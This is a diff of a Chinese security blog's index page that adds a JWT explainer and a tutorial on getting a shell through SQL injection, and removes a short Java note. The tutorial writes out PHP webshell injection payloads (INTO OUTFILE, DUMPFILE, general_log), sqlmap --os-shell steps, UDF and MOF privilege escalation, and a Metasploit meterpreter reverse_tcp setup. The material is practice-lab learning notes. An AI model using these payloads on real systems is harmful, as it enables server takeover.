@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-count">82</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,260 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/22/trick/JWT%EF%BC%88json%20web%20token)%E6%A6%82%E5%BF%B5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/06/22/trick/JWT%EF%BC%88json%20web%20token)%E6%A6%82%E5%BF%B5/" class="post-title-link" itemprop="url">JWT</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-22 23:12:52" itemprop="dateCreated datePublished" datetime="2022-06-22T23:12:52+08:00">2022-06-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-07-02 22:52:10" itemprop="dateModified" datetime="2022-07-02T22:52:10+08:00">2022-07-02</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>什么是JWT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>
+<p>类似于上面这样形式的字符串，就是一个典型的JWT，每个JWT都用.(点号)分割成三部分。分别是header,payload,signture<br>JWT 的原理：服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;123&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2077年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。<br>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p>
+<p>JWT的组成</p>
+<p>1.header：主要声明了JWT的签名算法；</p>
+<p>2.payload：主要承载了各种声明并传递明文数据；</p>
+<p>3.signture：拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT 也就是不安全的JWT，此时header中声明的签名算法为none。</p>
+<p>三个部分用·分割。形如 <code>xxxxx.yyyyy.zzzzz</code>的样式。 </p>
+<p>header:</p>
+<p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面代码中，<code>alg</code>属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；<code>typ</code>属性表示这个令牌（token）的类型（type），JWT 令牌统一写为<code>JWT</code>。<br>最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串 </p>
+<p>payload:</p>
+<p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss (issuer)：签发人</span><br><span class="line">exp (expiration time)：过期时间</span><br><span class="line">sub (subject)：主题</span><br><span class="line">aud (audience)：受众</span><br><span class="line">nbf (Not Before)：生效时间</span><br><span class="line">iat (Issued At)：签发时间</span><br><span class="line">jti (JWT ID)：编号</span><br></pre></td></tr></table></figure>
+<p>但是除了官方字段，我们也可以在这个部分自定义字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是以上两个部分JWt都是默认不加密的，任何人都可以读到，所以不要将秘密信息放在这个部分，这个json对象也要使用base64URL算法转换为字符串<br>3.Signature</p>
+<p>这个部分是对前两部分的签名，防止数据篡改</p>
+<p>首先，会有一个密钥，这个密钥只有服务端才知道，不能泄露，然后使用header里指定的签名算法，按照下面的公式产生签名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
+<p>计算结束后，把以上三个部分拼成一个字符串，每个部分用.分割，就可以分配给用户<br>4.Base64URL</p>
+<p>Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p>
+<p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是 Base64URL 算法。 </p>
+<p>JWT使用方式：</p>
+<p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
+<p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息<code>Authorization</code>字段里面，或者是跨域的时候，JWT就放在POST请求的数据体里面</p>
+<p>几个特点:</p>
+<p>（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</p>
+<p>（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。</p>
+<p>（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</p>
+<p>（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</p>
+<p>（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</p>
+<p>（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/22/SQL/SQL%20getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/06/22/SQL/SQL%20getshell/" class="post-title-link" itemprop="url">SQL getshell</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-06-22 22:48:54" itemprop="dateCreated datePublished" datetime="2022-06-22T22:48:54+08:00">2022-06-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-07-02 22:51:45" itemprop="dateModified" datetime="2022-07-02T22:51:45+08:00">2022-07-02</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>最近刚刚入职，师傅叫我第一熟悉的就是SQL getshell，常见的两种方法还是都知道的，只是没具体去实现过，这里做个总结。</p>
+<p>首先要明确的是sql注入getshell的方式：</p>
+<p>getshell是指攻击者通过利用SQL注入获取系统权限的方法，Webshell提权分两种：一是利用<strong>outfile函数</strong>，另外一种是利用**–os-shell**；UDF提权通过堆叠注入实现；MOF提权通过”条件竞争”实现.前文所说的两种方法即是Webshell提权，后两者会有一定的限制，这里阐述原理。</p>
+<p>Webshell提权:</p>
+<p>1.into outfile</p>
+<p>利用条件:</p>
+<p>web目录具有写的权限，能够使用单引号</p>
+<p>知道网站的绝对路径</p>
+<p>my.ini这个配置文件中有一项secure_file_priv没有具体值(注意不是空或者NULL)</p>
+<p><code>secure_file_priv</code>：secure_file_priv是用来限制load 、dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限 ,即就是拿来限制内外读写文件的一个配置</p>
+<p>关于secure_file_priv的相关：</p>
+<p>当该配置的值为null时，mysqld不允许导入和导出</p>
+<p>当该配置的值为/tmp/时，mysqld的导入和导出只能发生在/tmp/目录下(这里/tmp/表示限定目录，即我们自己设定的目录)</p>
+<p>当该配置的值为没有具体值时。mysqld的导入和导出没有限制</p>
+<p>所以为了我们能够使用into outfile函数写马进去，就需要将该配置设置为没有值，设置的方法如下:</p>
+<p> 1）看secure-file-priv参数的值：show global variables like ‘%secure%’;若secure_file_priv 的值默认为NULL，则表示限制mysqld 不允许导入|导出</p>
+<p>2）修改secure_file_priv 的值：我们可以在mysql/my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv = ‘ ‘ 即可；此时再查看secure_file_priv的值如下已经变为空了，设置完成后我们就可以利用这个函数来写入一句话木马</p>
+<p>以上操作建议使用navicat或者其他数据库可视化软件进行操作。</p>
+<p>写入Webshell：</p>
+<p>以上的secure_file_priv配置设置完成好，再满足我们具有写的权限和知晓绝对路径，就能尝试用sql语句写入一句话木马。这里方便测试，建议使用dvwa</p>
+<p>测试注入点以及判断列数这里跳过，都是老生常谈的操作，加上因为是我们自己搭的靶场，所以我们也知晓自己的路径</p>
+<p>所以我们可以写入一句话:</p>
+<p> 1’ union select 1,”<?php eval($_POST['cmd'])?>“ into outfile ‘E:\xxxxx\phpstudy\dvwa\test.php’ #</p>
+<p>这里路径中要使用双斜杠，第一个斜杠是转义的意思，不然无法解析，关于字符串的解析不一定只出现在web服务器里，其他情况下也有可能出现，而且windows采用的是单个斜杠的路径分割形式，导致我们对文件路径进行解析的时候发生不必要的错误，所以多加个斜杠进行转义。</p>
+<p>PS：这里我把马传进去的时候，我是用蚁剑连的，意外的发现以GET方式可能会被过滤，POST和REQUEST方式没有被过滤。</p>
+<p>2.os-shell原理</p>
+<p>os-shell就是sqlmap的一个功能，为存在的注入点提供一个可交互的webshell，大致原理就是将脚本插入数据库中，然后生成相应的文件，获取shell就能执行相关命令。其实原本–os-shell就是使用udf(用户自定义函数)获取webshell，也是通过into outfile向服务器写入两个文件，一个可执行系统命令，一个进行上传文件。</p>
+<p>利用条件:</p>
+<p>要求为DBA数据库管理员权限(–is-dba phpstudy搭建的一般为DBA)</p>
+<p>php的GPC关闭即主动转义的功能关闭，可以使用单双引号</p>
+<p>(不使用十六进制即0x编码),知道网站的绝对路径，而且文件不能覆盖写入，所以文件必须为不存在</p>
+<p><code>–secure-file-priv</code>没有值（该函数是能否执行-0s-shell的关键）：<code>–secure-file-priv</code>是mysql5.7+的新参数,用于限制LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录 </p>
+<p>PS:secure_file_priv为只读参数，不能使用set global命令修改，需要在my.ini加入后重启Mysql才可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap在指定的目录生成了两个文件（文件名是随机的，并不是固定的）</span><br><span class="line">以下1.php 2.php就是举例，不是实际文件名</span><br><span class="line">1.php 用来执行系统命令</span><br><span class="line"></span><br><span class="line">2.php 用来上传文件</span><br><span class="line"></span><br><span class="line">secure_file_priv没有具体值（在mysql/my.ini中查看）</span><br><span class="line"></span><br><span class="line">magic_quotes_gpc:（PHP magic_quotes_gpc作用范围是：WEB客户服务端；作用时间：请求开始时）</span><br></pre></td></tr></table></figure>
+
+<p>os-shell的具体实现步骤:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.启动sqlmap：sqlmap -r test.txt --os-shell</span><br><span class="line">2.选择语言(ASP，ASPX，JSP，PHP)首次使用默认asp语言</span><br><span class="line">3.输入绝对路径</span><br><span class="line">4.写木马文件</span><br><span class="line">  4.1：pwd //查看当前路径</span><br><span class="line">  4.2：echo &#x27;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;&#x27;&gt;&gt; 123.php  //将木马写入123.php</span><br><span class="line">  4.3：cat 123.php //打印123.php文件的内容</span><br><span class="line">5.用webshell连接</span><br></pre></td></tr></table></figure>
+
+<p>以上大致就是Webshell的两种方式，但是我们大多数都不知道路径即就是绝对路径，那产生路径问题的原因是？</p>
+<p>大多数sql注入的写Shell方式而言,网站的绝对的路径都是需要知道的,这里需要知道的原因不是因为outfile相对路径无法写shell,而是因为不知道路径,webshell无法连接且通过相对路径的方式写出来的shell大概率是无法执行的,或者是权限不够写</p>
+<p>所以我们可以采用dnslog注入，就是dns外带查询，通过查询相应的dns解析记录，来获取我们想要的数据</p>
+<p>PS：在实际场景中，盲注情况比较多，而联合查询的结果只会为了提供真与假，无法给予详细获取，通过手工测试需要花费大量时间，而使用sqlmap直接去跑数据也有可能触发waf或者被网站封ip，影响测试进度，所以dnslog注入就应运而生</p>
+<p>这里我们要使用一个load_File()函数，该函数会读取一个文件并将其内容作为字符串返回</p>
+<p>语法:load_file(filename)，其参数为文件的完整绝对路径</p>
+<p>其满足条件为：</p>
+<p>1.文件处于服务器上</p>
+<p>2.具有该文件的读权限，该属性和secure_file_priv状态相关</p>
+<p>3.文件必须所有人都可见，且字节大小小于最大限度</p>
+<p>除了上述的Webshell，还有udf以及mof，以及通过日志写入</p>
+<p>这里要引入一种不常见的注入方式，堆叠注入，如果对buu里的web有过练习，应该是有印象的</p>
+<p>堆叠注入写shell(日志注入)</p>
+<ul>
+<li>主要是利用到了Mysql的日志来进行写shell,payload如下:<code>set global general_log = &quot;ON&quot;;set global general_log_file=&#39;C:/xxx/www/muma.php&#39;;select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</code></li>
+<li>然后用webshell管理工具连接，就可以进行攻击</li>
+</ul>
+<p>如果说联合查询就能够写入shell，那当然是最好不过了</p>
+<p><code>union select 1,&#39;&lt;?php eval($_POST[1]);?&gt;&#39; INTO OUTFILE &#39;/var/www/html/test.php&#39; #</code></p>
+<p><code>union select 1,&#39;&lt;?php eval($_POST[1]);?&gt;&#39; INTO dumpfile &#39;/var/www/html/test.php&#39;#</code> </p>
+<p>这里对于outfile和dumpfile有一点小区分:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径,但是值的部分可hex</span><br><span class="line"></span><br><span class="line">在使用outfile时,文件中一行的末尾会自动换行,且可以导出全部数据,同时如果文本中存在\n等字符,会自动转义成\n,也就是会多加一个\</span><br><span class="line"></span><br><span class="line">outfile函数可以导出多行，而dumpfile只能导出一行数据；</span><br><span class="line"></span><br><span class="line">outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</span><br><span class="line"></span><br><span class="line">使用dumpfile时,一行的末尾不会换行且只能导出部分数据（这里比较数据比较少,没有体现出来）；但dumpfile不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时UDF提权时使用dumpfile来写入的原因）</span><br></pre></td></tr></table></figure>
+
+<p>udf提权:</p>
+<p>udf(user defined function)即用户自定义函数，是我们对数据库功能的一种自定义扩展，经过这个可以实现在mysql无法实现的功能</p>
+<p>条件：</p>
+<p>1.sqlmap的udf动态链接库文件：sqlmap根目录/data/udf/mysql</p>
+<p>2.一般来说动态链接库为了防止被误杀都会进行编码处理，不能直接使用，所以我们可以用sqlmap自带的解码工具cloak.py来解码使用，cloak.py 的位置为：sqlmap根目录/extra/cloak/cloak.py</p>
+<p>以下为举例payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table udfeval(shellcode longblob);    //创建表</span><br><span class="line"></span><br><span class="line">insert into udfeval values(load_file(&#x27;F:/udf.dll&#x27;));  //在表里插入信息</span><br><span class="line"></span><br><span class="line">select shellcode from udfeval into dumpfile &#x27;C:\\windows\udf.dll&#x27;;  //将表里面的信息导出</span><br></pre></td></tr></table></figure>
+
+<p>以上方法都需要知道secure_file_priv的值，那我们可以通过–sql-shell来知道输入sql语句select@@secure_file_priv提示为NULL，所以就会出现无法继续的错误</p>
+<p>mof提权</p>
+<p>M0F提权原理<strong>：</strong>它就是利用了c:/windows/system32/wbem/mof/目录下的nullevt.mof文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p>
+<p>条件:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Win sever 03以后无法使用</span><br><span class="line"></span><br><span class="line">Mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</span><br><span class="line"></span><br><span class="line">secure-file-priv参数不为null</span><br></pre></td></tr></table></figure>
+<p>因为mof文件每五秒就会执行一次，而且是系统权限，我们可以通过load_file将文件写入/wbem/mof里，然后系统每隔五秒就会执行我们上传的mof。我们可以通过mof里自己编写的脚本，来让系统执行命令，进行提权<br>以下为我参考的相关资料:（vbs脚本）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MSF脚本自动化</span><br><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"></span><br><span class="line"># 设置payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"># 设置目标 MySQL 的基础信息</span><br><span class="line">set rhosts 192.168.127.132</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>缺点：攻击的选择范围较小，而且清理痕迹可能会比较麻烦</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1117,239 +1371,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/Java/Java%E7%AC%94%E8%AE%B05/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/28/Java/Java%E7%AC%94%E8%AE%B05/" class="post-title-link" itemprop="url">Java笔记5</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-28 15:45:07" itemprop="dateCreated datePublished" datetime="2022-04-28T15:45:07+08:00">2022-04-28</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-05-03 21:16:57" itemprop="dateModified" datetime="2022-05-03T21:16:57+08:00">2022-05-03</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>子串，顾名思义就是原本字符串其中一部分字符组成的新字符串，那我们可以尝试用substring返回一个新的字符串，其中包含已有字符串从指定索引到末尾的字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String text = &quot;woshishuaige&quot;;</span><br><span class="line">		System.out.println(text.substring(0));</span><br><span class="line">		System.out.println(text.substring(2));</span><br><span class="line">		System.out.println(text.substring(5));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>运行截图<br><img src="data:image/png;base64,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